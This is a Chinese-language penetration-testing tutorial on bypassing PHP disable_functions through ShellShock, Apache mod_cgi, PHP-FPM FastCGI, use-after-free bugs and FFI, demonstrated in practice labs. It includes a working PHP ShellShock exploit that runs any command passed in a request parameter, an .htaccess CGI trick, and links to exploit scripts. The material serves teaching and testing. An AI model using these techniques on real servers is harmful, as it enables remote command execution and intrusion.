+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312130111.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312130111.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312130111.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312130111.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312130111.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312130111.png-water_print" /></p>
+<h2 id="4-利用破壳漏洞--shellshock">4 利用「破壳漏洞」- ShellShock</h2>
+<h3 id="41-前提">4.1 前提</h3>
+<ul>
+<li>Linux 操作系统</li>
+<li><code>putenv()</code>、<code>mail()</code> 或 <code>error_log()</code> 函数可用</li>
+<li>目标系统的 <code>/bin/bash</code> 存在 <code>CVE-2014-6271</code> 漏洞</li>
+<li><code>/bin/sh -&gt; /bin/bash</code> sh 默认的 shell 是 bash</li>
+</ul>
+<h3 id="42-原理">4.2 原理</h3>
+<p>该方法利用的 bash 中的一个老漏洞，即 Bash Shellshock 破壳漏洞（CVE-2014-6271）。</p>
+<p>在 Bash 中一种独有的方法来定义函数 , 即 : <strong>通过环境变量来定义函数</strong>。当某个环境变量的值以字符串  <code>() {</code>  的格式作为开头， 那么该变量就会被当前 Bash 当作一个导出函数( <code>export function</code> ) , 该函数仅会在当前 Bash 的子进程中生效。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011739693.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011739693.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011739693.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011739693.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011739693.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011739693.png-water_print" /></p>
+<p>一般函数体内的代码不会被执行，但破壳漏洞会错误的将 <code>{}</code> 花括号外的命令进行执行。PHP 里的某些函数（例如：mail()、imap_mail()）能调用 popen 或其他能够派生 bash 子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令。</p>
+<p>EXP 脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">function</span> <span class="nf">runcmd</span><span class="p">(</span><span class="nv">$c</span><span class="p">){</span>
+  <span class="nv">$d</span> <span class="o">=</span> <span class="nx">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;SCRIPT_FILENAME&#34;</span><span class="p">]);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;/&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;putenv&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;mail&#39;</span><span class="p">))){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">strstr</span><span class="p">(</span><span class="nx">readlink</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">),</span> <span class="s2">&#34;bash&#34;</span><span class="p">)</span><span class="o">!=</span><span class="k">FALSE</span><span class="p">){</span>
+      <span class="nv">$tmp</span><span class="o">=</span><span class="nx">tempnam</span><span class="p">(</span><span class="nx">sys_get_temp_dir</span><span class="p">(),</span> <span class="s1">&#39;as&#39;</span><span class="p">);</span>
+      <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;PHP_LOL=() { x; }; </span><span class="si">$c</span><span class="s2"> &gt;</span><span class="si">$tmp</span><span class="s2"> 2&gt;&amp;1&#34;</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">error_log</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+      <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;a@127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;-bv&#34;</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+      <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Not vuln (not bash)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
+    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$output</span><span class="o">!=</span><span class="s2">&#34;&#34;</span><span class="p">){</span>
+      <span class="k">print</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+      <span class="k">print</span><span class="p">(</span><span class="s2">&#34;No output, or not vuln.&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;不满足使用条件&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// runcmd(&#34;whoami&#34;); // 要执行的命令
+</span><span class="c1"></span><span class="nx">runcmd</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span> <span class="c1">// ?cmd=whoami
+</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="43-利用">4.3 利用</h3>
+<p>同样利用 <a href="https://github.com/AntSwordProject/AntSword-Labs" target="_blank" rel="noopener noreffer">AntSword-Labs</a> 里的环境：<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2" target="_blank" rel="noopener noreffer">bypass_disable_functions/2</a></p>
+<p>尝试使用 <code>http://IP:18080/?ant=system('ls');</code> 执行失败。</p>
+<p>AntSword 虚拟终端中已经集成了对 ShellShock 的利用，直接在虚拟终端执行命令即可绕过disable_functions：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011718915.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011718915.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011718915.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011718915.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011718915.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011718915.png-water_print" /></p>
+<p>上图中进程树可以看到，利用了 PHP <code>error_log</code> 函数在执行 <code>sh -c -t -i </code>时, Bash 的 ShellShock 漏洞, 从而实现了执行我们自定义命令的目的。</p>
+<h2 id="5-利用-cgi">5 利用 CGI</h2>
+<h3 id="51-apache-mod-cgi">5.1 Apache Mod CGI</h3>
+<h4 id="511-前提">5.1.1 前提</h4>
+<ul>
+<li>Linux 操作系统</li>
+<li>Apache + PHP (apache 使用 apache_mod_php)</li>
+<li>Apache 开启了 <code>cgi</code>、<code>rewrite</code></li>
+<li>Web 目录给了 <code>AllowOverride</code> 权限</li>
+<li>当前目录可写</li>
+</ul>
+<h4 id="512-原理">5.1.2 原理</h4>
+<p>为了解决 Web 服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。简单理解，可以认为 CGI 是 Web 服务器和运行在其上的应用程序进行“交流”的一种约定。</p>
+<p>当遇到动态脚本请求时，Web 服务器主进程就会 Fork 创建出一个新的进程来启动 CGI 程序，运行外部 C 程序或 Perl、PHP 脚本等，也就是将动态脚本交给 CGI 程序来处理。启动 CGI 程序需要一个过程，如读取配置文件、加载扩展等。当 CGI 程序启动后会去解析动态脚本，然后将结果返回给 Web 服务器，最后由 Web 服务器将结果返回给客户端，之前 Fork 出来的进程也随之关闭。这样，每次用户请求动态脚本，Web 服务器都要重新 Fork 创建一个新进程去启动 CGI 程序，由 CGI 程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p>
+<p>而对于 Mod CGI，Web 服务器可以内置 Perl 解释器或 PHP 解释器。 也就是说将这些解释器做成模块的方式，Web 服务器会在启动的时候就启动这些解释器。 当有新的动态请求进来时，Web 服务器就是自己解析这些动态脚本，省得重新 Fork 一个进程，效率提高了。</p>
+<p>任何具有 MIME 类型 <code>application/x-httpd-cgi</code> 或者被 <code>cgi-script</code> 处理器处理的文件都将被作为 CGI 脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为 CGI 脚本，一种是文件具有已由 AddType 指令定义的扩展名，另一种是文件位于 <code>ScriptAlias</code> 目录中。</p>
+<p>Apache 在配置开启 CGI 后可以用 ScriptAlias 指令指定一个目录，指定的目录下面便可以存放可执行的 CGI 程序。若是想临时允许一个目录可以执行 CGI 程序并且使得服务器将自定义的后缀解析为 CGI 程序执行，则可以在目的目录下使用 htaccess 文件进行配置，如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Options +ExecCGI
+AddHandler cgi-script .xxx
+</code></pre></td></tr></table>
+</div>
+</div><p>这样便会将当前目录下的所有的 .xxx 文件当做 CGI 程序执行了。由于 CGI 程序可以执行命令，那我们可以利用 CGI 来执行系统命令绕过 disable_functions。</p>
+<h4 id="513-利用">5.1.3 利用</h4>
+<p>同样利用 <a href="https://github.com/AntSwordProject/AntSword-Labs" target="_blank" rel="noopener noreffer">AntSword-Labs</a> 里的环境：<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3" target="_blank" rel="noopener noreffer">bypass_disable_functions/3</a></p>
+<p>用蚁剑拿到 shell 后无法执行命令：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print" /></p>
+<p>开启 CGI：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012051858.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012051858.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012051858.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012051858.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012051858.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012051858.png-water_print" /></p>
+<h3 id="52-php-fpm">5.2 PHP-fpm</h3>
+<h4 id="521-前提">5.2.1 前提</h4>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP-FPM</li>
+<li>存在可写的目录，需要上传 <code>.so</code> 文件</li>
+</ul>
+<h4 id="522-原理">5.2.2 原理</h4>
+<p>PHP-FPM 是 Fastcgi 的协议解析器，Web 服务器使用 CGI 协议封装好用户的请求发送给 FPM。FPM 按照 CGI 的协议将 TCP 流解析成真正的数据。</p>
+<p>举个例子，用户访问 <code>http://127.0.0.1/index.php?a=1&amp;b=2</code> 时，如果 web 目录是 <code>/var/www/html</code>，那么 Nginx 会将这个请求变成如下 key-value 对：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+    <span class="err">&#39;GATEWAY_INTERFACE&#39;:</span> <span class="err">&#39;FastCGI/1.0&#39;,</span>
+    <span class="err">&#39;REQUEST_METHOD&#39;:</span> <span class="err">&#39;GET&#39;,</span>
+    <span class="err">&#39;SCRIPT_FILENAME&#39;:</span> <span class="err">&#39;/var/www/html/index.php&#39;,</span>
+    <span class="err">&#39;SCRIPT_NAME&#39;:</span> <span class="err">&#39;/index.php&#39;,</span>
+    <span class="err">&#39;QUERY_STRING&#39;:</span> <span class="err">&#39;?a=1&amp;b=2&#39;,</span>
+    <span class="err">&#39;REQUEST_URI&#39;:</span> <span class="err">&#39;/index.php?a=1&amp;b=2&#39;,</span>
+    <span class="err">&#39;DOCUMENT_ROOT&#39;:</span> <span class="err">&#39;/var/www/html&#39;,</span>
+    <span class="err">&#39;SERVER_SOFTWARE&#39;:</span> <span class="err">&#39;php/fcgiclient&#39;,</span>
+    <span class="err">&#39;REMOTE_ADDR&#39;:</span> <span class="err">&#39;127.0.0.1&#39;,</span>
+    <span class="err">&#39;REMOTE_PORT&#39;:</span> <span class="err">&#39;12345&#39;,</span>
+    <span class="err">&#39;SERVER_ADDR&#39;:</span> <span class="err">&#39;127.0.0.1&#39;,</span>
+    <span class="err">&#39;SERVER_PORT&#39;:</span> <span class="err">&#39;80&#39;,</span>
+    <span class="err">&#39;SERVER_NAME&#39;:</span> <span class="nt">&#34;localhost&#34;</span><span class="p">,</span>
+    <span class="err">&#39;SERVER_PROTOCOL&#39;:</span> <span class="err">&#39;HTTP/1.1&#39;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这个数组其实就是 PHP 中 <code>$_SERVER</code> 数组的一部分，也就是 PHP 里的环境变量。但环境变量的作用不仅是填充 <code>$_SERVER</code> 数组，也是告诉 fpm：要执行哪个 PHP 文件。</p>
+<p>PHP-FPM 拿到 Fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行 <code>SCRIPT_FILENAME</code> 的值指向的 PHP 文件，也就是 <code>/var/www/html/index.php</code> 。</p>
+<h4 id="523-利用">5.2.3 利用</h4>
+<p>由于 FPM 默认监听的是 9000 端口，我们就可以绕过 Web 服务器，直接构造 Fastcgi 协议，和 fpm 进行通信。于是就有了利用 Webshell 直接与 FPM 通信 来绕过 disable functions 的姿势。</p>
+<p>但是，在构造 Fastcgi，就能执行任意 PHP 代码前，需要突破几个限制：</p>
+<ul>
+<li>既然是请求，那么 <code>SCRIPT_FILENAME</code> 就相当的重要。前面说过，fpm 是根据这个值来执行 PHP 文件文件的，如果不存在，会直接返回 404，所以想要利用这个漏洞，就得找到一个已经存在的 PHP 文件。在一般进行源安装 PHP 的时候，服务器都会附带上一些 PHP 文件，如果说我们没有收集到目标 Web 目录的信息的话，可以采用这种方法。</li>
+<li>即使能控制 <code>SCRIPT_FILENAME</code>，让 fpm 执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。那要如何绕过这种限制呢？可以从 <code>php.ini</code> 入手。它有两个特殊选项，分别是 <code>auto_prepend_file</code> 和 <code>auto_append_file</code>。<code>auto_prepend_file</code> 的功能是在执行目标文件之前，先包含它指定的文件。那么就有趣了，假设我们设置 <code>auto_prepend_file</code> 为<code>php://input</code>，那么就等于在执行任何 PHP 文件前都要包含一遍 POST 过去的内容。所以，只需要把待执行的代码放在 POST Body 中进行远程文件包含，这样就能做到任意代码执行了。</li>
+<li>虽然可以通过远程文件包含执行任意代码，但是远程文件包含是有 <code>allow_url_include</code> 这个限制因素的，如果没有为 <code>ON</code> 的话就没有办法进行远程文件包含。这里，PHP-FPM 有两个可以设置 PHP 配置项的 KEY-VALUE，即 <code>PHP_VALUE</code> 和  <code>PHP_ADMIN_VALUE</code>，<code>PHP_VALUE</code>可以用来设置 php.ini，<code>PHP_ADMIN_VALUE</code> 则可以设置所有选项（disable_functions 选项除外），这样就解决问题了。</li>
+</ul>
+<p>利用 <a href="https://github.com/AntSwordProject/AntSword-Labs" target="_blank" rel="noopener noreffer">AntSword-Labs</a> 里的环境：<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/4" target="_blank" rel="noopener noreffer">bypass_disable_functions/4</a></p>
+<p>用蚁剑拿到 shell 后无法执行命令：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012137138.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012137138.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012137138.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012137138.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012137138.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109012137138.png-water_print" /></p>
+<p>注意该模式下需要选择 PHP-FPM 的接口地址, 需要自行找配置文件查 FPM 接口地址，默认的是 <code>unix:///</code> 本地 socket 这种的，如果配置成 TCP 的默认是 <code>127.0.0.1:9000</code></p>
+<p>成功后可以看到 <code>/var/www/html/</code> 目录下新建了一个 <code>.antproxy.php</code> 文件。连接 <code>.antproxy.php</code>，就可以成功执行命令。</p>
+<h2 id="6-利用-uaf-bypass">6 利用 UAF Bypass</h2>
+<h3 id="61-gc-uaf">6.1 GC UAF</h3>
+<h4 id="611-前提">6.1.1 前提</h4>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP 7.0 - PHP 7.3</li>
+</ul>
+<h4 id="612-原理">6.1.2 原理</h4>
+<p>此漏洞利用 PHP 垃圾收集器中存在三年的一个 <a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener noreffer">bug</a> ，通过PHP垃圾收集器中<strong>堆溢出</strong>来绕过 <code>disable_functions</code> 并执行系统命令。</p>
+<p>利用脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener noreffer">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p>
+<h4 id="613-利用">6.1.3 利用</h4>
+<p>蚁剑靶场 <a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7" target="_blank" rel="noopener noreffer">bypass_disable_functions/7</a></p>
+<p>用蚁剑拿到 shell 后无法执行命令：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046023.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046023.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046023.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046023.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046023.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046023.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046640.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046640.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046640.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046640.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046640.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109022046640.png-water_print" /></p>
+<h3 id="62-json-serializer-uaf">6.2 Json Serializer UAF</h3>
+<h4 id="621-前提">6.2.1 前提</h4>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP 版本
+<ul>
+<li>7.1 - all versions to date</li>
+<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
+<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
+</ul>
+</li>
+</ul>
+<h4 id="622-原理">6.2.2 原理</h4>
+<p>此漏洞利用 json 序列化程序中的释放后使用<a href="https://bugs.php.net/bug.php?id=77843" target="_blank" rel="noopener noreffer">漏洞</a>，利用 json 序列化程序中的堆溢出触发，以绕过 <code>disable_functions</code> 和执行系统命令。</p>
+<p>利用脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener noreffer">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
+<h4 id="623-利用">6.2.3 利用</h4>
+<p>蚁剑靶场 <a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6" target="_blank" rel="noopener noreffer">bypass_disable_functions/6</a></p>
+<p>用蚁剑拿到 shell 后无法执行命令：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108312126976.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703229.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703229.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703229.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703229.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703229.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703229.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703579.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703579.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703579.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703579.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703579.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109031703579.png-water_print" /></p>
+<div class="details admonition warning open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-exclamation-triangle fa-fw"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">这种方式不一定保证成功，因此当遇到命令无回显结果的时候，可以重新执行。</div>
+        </div>
+    </div>
+<h3 id="63-backtrace-uaf">6.3 Backtrace UAF</h3>
+<h4 id="631-前提">6.3.1 前提</h4>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP 版本
+<ul>
+<li>7.0 - all versions to date</li>
+<li>7.1 - all versions to date</li>
+<li>7.2 - all versions to date</li>
+<li>7.3 &lt; 7.3.15 (released 20 Feb 2020)</li>
+<li>7.4 &lt; 7.4.3 (released 20 Feb 2020)</li>
+</ul>
+</li>
+</ul>
+<h4 id="632-原理">6.3.2 原理</h4>
+<p>该漏洞利用在 <code>debug_backtrace()</code> 函数中使用了两年的一个 <a href="https://bugs.php.net/bug.php?id=76047" target="_blank" rel="noopener noreffer">bug</a>。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。</p>
+<p>利用脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener noreffer">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p>
+<h3 id="64-spldoublylinkedlist-uaf">6.4 SplDoublyLinkedList UAF</h3>
+<h4 id="641-前提">6.4.1 前提</h4>
+<ul>
+<li>PHP 版本
+<ul>
+<li>PHP v7.4.10及其之前版本</li>
+<li>PHP v8.0（Alpha）</li>
+</ul>
+</li>
+</ul>
+<h4 id="642-原理">6.4.2 原理</h4>
+<p>具体原理参考：<a href="https://xz.aliyun.com/t/8355" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/8355</a></p>
+<p>将脚本上传到目标主机上有权限的目录中（/var/tmp/exploit.php），包含该 exploit.php 脚本即可成功执行命令。</p>
+<h2 id="7-利用-ffi-扩展执行命令">7 利用 FFI 扩展执行命令</h2>
+<h3 id="71-前提">7.1 前提</h3>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP &gt;= 7.4</li>
+<li>开启了 FFI 扩展且 <code>ffi.enable=true</code></li>
+</ul>
+<h3 id="72-原理">7.2 原理</h3>
+<p>PHP 7.4 的 FFI（Foreign Function Interface），即外部函数接口，允许从用户在 PHP 代码中去调用 C 代码。</p>
